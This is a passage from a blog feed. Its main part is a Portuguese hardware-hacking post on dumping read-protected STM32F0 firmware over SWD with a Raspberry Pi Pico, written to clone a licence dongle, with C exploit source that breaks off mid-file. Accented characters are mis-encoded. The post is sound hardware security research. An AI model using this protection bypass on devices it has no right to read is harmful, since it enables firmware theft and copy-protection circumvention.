        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">fifoType</span> <span class="o">!=</span> <span class="n">ttype</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">endfifo</span><span class="p">()</span>
            <span class="n">self</span><span class="p">.</span><span class="n">fifoType</span> <span class="o">=</span> <span class="n">ttype</span>
            <span class="n">self</span><span class="p">.</span><span class="n">fifoStart</span> <span class="o">=</span> <span class="n">start</span>
        <span class="n">self</span><span class="p">.</span><span class="n">fifoEnd</span> <span class="o">=</span> <span class="n">end</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="n">fifoData</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</code></pre></div></div>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Satellite" /><category term="SDR" /><category term="Flash" /><category term="PAX" /><category term="Hardware Hacking" /><category term="RE" /><category term="Reverse Engineering" /><category term="NAND" /><category term="PAX" /><category term="RT809H" /><summary type="html"><![CDATA[O TPM 2.0, tamb√©m conhecido como Trusted Platform Module 2.0, √© um recurso de seguran√ßa de hardware que est√° incorporado em muitos computadores modernos. Sua finalidade √© proporcionar uma maneira segura de armazenar chaves criptogr√°ficas e outros dados sens√≠veis, tais como senhas e certificados digitais, visando proteger contra diversas amea√ßas de seguran√ßa, incluindo acesso n√£o autorizado ao hardware e software de um computador. O TPM 2.0 representa uma evolu√ß√£o da especifica√ß√£o original do TPM, desenvolvida pelo Trusted Computing Group (TCG), e apresenta recursos e capacidades adicionais, como suporte a algoritmos criptogr√°ficos adicionais e a capacidade de armazenar quantidades maiores de dados.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/gepeto/tpm2.0.jpg" /><media:content medium="image" url="https://lucasteske.dev/assets/gepeto/tpm2.0.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">STM32F0x Protected Firmware Dumper</title><link href="https://lucasteske.dev/2024/01/stm32f0x-protected-firmware-dumper" rel="alternate" type="text/html" title="STM32F0x Protected Firmware Dumper" /><published>2024-01-16T05:23:00+00:00</published><updated>2024-01-16T05:23:00+00:00</updated><id>https://lucasteske.dev/2024/01/stm32f0x-protected-firmware-dumper</id><content type="html" xml:base="https://lucasteske.dev/2024/01/stm32f0x-protected-firmware-dumper"><![CDATA[<p>No processo do meu hobby de hackear hardware, encontrei um clone chin√™s de um dongle HASP HL equipado com um processador STM32F042G6U6. Minha inten√ß√£o era clon√°-lo, e durante minha explora√ß√£o, descobri quatro pinos da interface de depura√ß√£o SWD localizados na parte inferior da PCB. Soldei um conector de 4 pinos nesses pinos para facilitar o acesso.</p>

<p>Utilizando meu Segger J-Link como uma sonda de depura√ß√£o, embora qualquer adaptador JTAG deva ser suficiente, eu o combinei com o OpenOCD. Dado que o chipset √© reconhecido pelo OpenOCD, eu criei um script para extrair todos os dados poss√≠veis, condicionados √† habilita√ß√£o.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adapter driver jlink
transport select swd
adapter_khz 4000
source [find target/stm32f0x.cfg]
init
dap info
reset halt
flash read_bank 0 firmwareF1.bin 0 0x8000
reset
shutdown
</code></pre></div></div>

<p>Mas, encontrei um obst√°culo - a prote√ß√£o RDP (Read-Out Protection) do dispositivo estava ativada, mesmo com o SWD ativo. Sem problemas, pensei, e tentei contornar isso com inje√ß√£o de falha de tens√£o. No entanto, o gerador de clock interno no dispositivo tornou a interfer√™ncia no clock invi√°vel. Ap√≥s algumas horas sem progresso, ficou claro que eu precisava de um novo plano.</p>

<p>Minha busca por alternativas me levou a um artigo abrangente detalhando tr√™s metodologias para extrair mem√≥ria protegida:</p>

<p><a href="https://www.aisec.fraunhofer.de/en/FirmwareProtection.html">https://www.aisec.fraunhofer.de/en/FirmwareProtection.html</a></p>

<p>Tentei o M√©todo de Boot a Frio, mas sem sucesso - provavelmente porque eu n√£o conseguia mexer no rel√≥gio do dispositivo, e isso √© praticamente um ponto crucial para que funcionasse. O m√©todo UVC? Muito arriscado, e eu n√£o estava disposto a arruinar o dongle. Ent√£o, restou a interfer√™ncia no Porta de Depura√ß√£o SWD.</p>

<p>Havia uma Prova de Conceito (PoC) para esta falha, e ela tinha algumas informa√ß√µes boas, mas era tudo sobre c√≥digo STM32 com um monte de coisas espec√≠ficas do dispositivo. Eu precisava de algo mais universal. Depois de analisar a PoC e o artigo, misturei um pouco do meu pr√≥prio conhecimento e criei um novo c√≥digo.</p>

<p>Para o campo de testes, conectei um Raspberry Pi Pico com <a href="http://platform.io/">platform.io</a>. Tive que ir direto com o protocolo SWD, pois sondas de depura√ß√£o padr√£o como meu J-Link eram muito invasivas na inicializa√ß√£o do dispositivo. Essa falha precisava de uma a√ß√£o r√°pida na leitura da mem√≥ria flash, e cada milissegundo contava.</p>

<p>Aqui est√° o ponto crucial - a prote√ß√£o do c√≥digo s√≥ entra em a√ß√£o quando voc√™ tenta tocar na mem√≥ria flash com o modo de depura√ß√£o ativado. Mas se voc√™ for r√°pido, pode capturar um DWORD da flash antes que as portas se fechem.</p>

<p>Para extrair o firmware inteiro, √© uma dan√ßa com o pino de reset e a fonte de energia do dispositivo. Voc√™ tem que ciclar a energia para resetar a bandeira do modo de depura√ß√£o. Aqui est√° o passo a passo:</p>

<ol>
  <li>Acione o pino de reset</li>
  <li>Ligue o dispositivo</li>
  <li>Solte o pino de reset</li>
  <li>Fa√ßa a leitura</li>
  <li>Corte a energia</li>
  <li>Repita o processo</li>
</ol>

<p>O Raspberry Pi Pico foi tudo o que eu precisei para alimentar o dispositivo, j√° que o STM32 n√£o consome muita energia. Se voc√™ estiver lidando com algo que exija mais energia, um transistor ou rel√© para alternar a energia pode ser a solu√ß√£o. Voc√™ pode conferir toda a opera√ß√£o e o c√≥digo em <a href="https://github.com/racerxdl/stm32f0-pico-dump">https://github.com/racerxdl/stm32f0-pico-dump</a> ou dispon√≠vel abaixo.</p>

<p><img src="/assets/posts/patreon/Pasted image 20230124035820.png" alt="Dump funcionando de bytes" />
<em>Uma imagem mostrando fluxos de dados DWORD do firmware STM32F0 sendo transmitidos em tempo real via porta serial do Raspberry Pi Pico, iluminando o terminal com linhas de c√≥digo extra√≠do.</em></p>

<h2 id="code">Code</h2>

<h3 id="halc">hal.c</h3>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */</span>

<span class="cp">#include</span> <span class="cpf">"main.h"</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">targetInit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">targetPowerOff</span><span class="p">();</span>
    <span class="n">targetReset</span><span class="p">();</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">targetReset</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">TARGET_RESET_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">targetRestore</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">TARGET_RESET_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">targetPowerOff</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">TARGET_PWR_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">targetPowerOn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">TARGET_PWR_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="readerc">reader.c</h3>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */</span>

<span class="cp">#include</span> <span class="cpf">"main.h"</span><span class="cp">
#include</span> <span class="cpf">"swd.h"</span><span class="cp">
</span>
<span class="cm">/* Reads one 32-bit word from read-protection Flash memory. Address must be 32-bit aligned */</span>
<span class="n">swdStatus_t</span> <span class="nf">extractFlashData</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="k">const</span> <span class="n">address</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">dbgStatus</span><span class="p">;</span>

    <span class="cm">/* Add some jitter on the moment of attack (may increase attack effectiveness) */</span>
    <span class="k">static</span> <span class="kt">uint16_t</span> <span class="n">delayJitter</span> <span class="o">=</span> <span class="n">DELAY_JITTER_MS_MIN</span><span class="p">;</span>

    <span class="kt">uint32_t</span> <span class="n">extractedData</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">idCode</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="cm">/* Limit the maximum number of attempts PER WORD */</span>
    <span class="kt">uint32_t</span> <span class="n">numReadAttempts</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="cm">/* try up to MAX_READ_TRIES times until we have the data */</span>
    <span class="k">do</span> <span class="p">{</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">LED1_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>

        <span class="n">targetPowerOn</span><span class="p">();</span>

        <span class="n">delay</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>

        <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdInit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">idCode</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdEnableDebugIF</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdSetAP32BitMode</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdSelectAHBAP</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">targetRestore</span><span class="p">();</span>
            <span class="n">delay</span><span class="p">(</span><span class="n">delayJitter</span><span class="p">);</span>

            <span class="cm">/* The magic happens here! */</span>
            <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdReadAHBAddr</span><span class="p">((</span><span class="n">address</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFCu</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">extractedData</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">targetReset</span><span class="p">();</span>

        <span class="cm">/* Check whether readout was successful. Only if swdStatusOK is returned, extractedData is valid */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">extractedData</span><span class="p">;</span>
            <span class="n">digitalWrite</span><span class="p">(</span><span class="n">LED1_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="o">++</span><span class="n">numReadAttempts</span><span class="p">;</span>

            <span class="n">delayJitter</span> <span class="o">+=</span> <span class="n">DELAY_JITTER_MS_INCREMENT</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">delayJitter</span> <span class="o">&gt;=</span> <span class="n">DELAY_JITTER_MS_MAX</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">delayJitter</span> <span class="o">=</span> <span class="n">DELAY_JITTER_MS_MIN</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="n">targetPowerOff</span><span class="p">();</span>

        <span class="n">delay</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="n">targetRestore</span><span class="p">();</span>
        <span class="n">delay</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
        <span class="n">targetReset</span><span class="p">();</span>
        <span class="n">delay</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="p">}</span> <span class="k">while</span> <span class="p">((</span><span class="n">dbgStatus</span> <span class="o">!=</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">numReadAttempts</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">MAX_READ_ATTEMPTS</span><span class="p">)));</span>

    <span class="k">return</span> <span class="n">dbgStatus</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="swdc">swd.c</h3>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */</span>

<span class="cp">#include</span> <span class="cpf">"swd.h"</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">"main.h"</span><span class="cp">
</span>
<span class="cp">#define MWAIT __asm__ __volatile__( \
    ".syntax unified 		\n"          \
    "	movs r0, #0x20 		\n"          \
    "1: 	subs r0, #1 		\n"          \
    "	bne 1b 			\n"                 \
    ".syntax divided"               \
    :                               \
    :                               \
    : "cc", "r0")
</span>
<span class="cp">#define N_READ_TURN (3u)
</span>
<span class="k">static</span> <span class="kt">uint8_t</span> <span class="nf">swdParity</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDatasend</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataIdle</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataPP</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdTurnaround</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdReset</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataRead</span><span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdBuildHeader</span><span class="p">(</span><span class="n">swdAccessDirection_t</span> <span class="k">const</span> <span class="n">adir</span><span class="p">,</span> <span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint8_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">header</span><span class="p">);</span>
<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">);</span>
<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="k">const</span> <span class="n">data</span><span class="p">);</span>
<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdReadAP0</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">);</span>

<span class="k">static</span> <span class="kt">uint8_t</span> <span class="nf">swdParity</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="n">par</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">cdata</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0x07u</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0u</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cdata</span> <span class="o">=</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
            <span class="o">++</span><span class="n">data</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">par</span> <span class="o">^=</span> <span class="p">(</span><span class="n">cdata</span> <span class="o">&amp;</span> <span class="mh">0x01u</span><span class="p">);</span>
        <span class="n">cdata</span> <span class="o">&gt;&gt;=</span> <span class="mi">1u</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">par</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDatasend</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="n">cdata</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0x07u</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x00u</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cdata</span> <span class="o">=</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
            <span class="o">++</span><span class="n">data</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">((</span><span class="n">cdata</span> <span class="o">&amp;</span> <span class="mh">0x01u</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x01u</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">MWAIT</span><span class="p">;</span>

        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="n">cdata</span> <span class="o">&gt;&gt;=</span> <span class="mi">1u</span><span class="p">;</span>
        <span class="n">MWAIT</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataIdle</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">INPUT</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataPP</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">MWAIT</span><span class="p">;</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdTurnaround</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataRead</span><span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">cdata</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="n">MWAIT</span><span class="p">;</span>
    <span class="n">swdDataIdle</span><span class="p">();</span>
    <span class="n">MWAIT</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">cdata</span> <span class="o">&gt;&gt;=</span> <span class="mi">1u</span><span class="p">;</span>
        <span class="n">cdata</span> <span class="o">|=</span> <span class="n">digitalRead</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">)</span> <span class="o">?</span> <span class="mh">0x80u</span> <span class="o">:</span> <span class="mh">0x00u</span><span class="p">;</span>
        <span class="n">data</span><span class="p">[(((</span><span class="n">len</span> <span class="o">+</span> <span class="mi">7u</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3u</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">i</span> <span class="o">&gt;&gt;</span> <span class="mi">3u</span><span class="p">))</span> <span class="o">-</span> <span class="mi">1u</span><span class="p">]</span> <span class="o">=</span> <span class="n">cdata</span><span class="p">;</span>

        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>

        <span class="cm">/* clear buffer after reading 8 bytes */</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0x07u</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x07u</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cdata</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdReset</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>

    <span class="n">MWAIT</span><span class="p">;</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>

    <span class="cm">/* 50 clk+x */</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">50u</span> <span class="o">+</span> <span class="mi">10u</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">3u</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdBuildHeader</span><span class="p">(</span><span class="n">swdAccessDirection_t</span> <span class="k">const</span> <span class="n">adir</span><span class="p">,</span> <span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint8_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">header</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">portSel</span> <span class="o">==</span> <span class="n">swdPortSelectAP</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x02u</span><span class="p">;</span> <span class="cm">/* Access AP */</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">adir</span> <span class="o">==</span> <span class="n">swdAccessDirectionRead</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x04u</span><span class="p">;</span> <span class="cm">/* read access */</span>
    <span class="p">}</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">A32</span><span class="p">)</span> <span class="p">{</span>
